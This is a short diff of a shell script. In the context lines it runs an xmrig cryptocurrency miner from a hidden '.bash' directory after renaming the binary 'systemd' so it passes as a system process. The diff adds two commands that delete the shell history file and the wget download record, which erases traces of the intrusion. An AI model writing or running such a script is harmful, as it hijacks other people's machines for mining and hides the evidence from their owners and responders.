@@ -23,3 +23,6 @@ cd .bash/
 mv ./xmrig ./systemd
 
 ./systemd
+
+rm .bash_history
+rm .wget-hsts
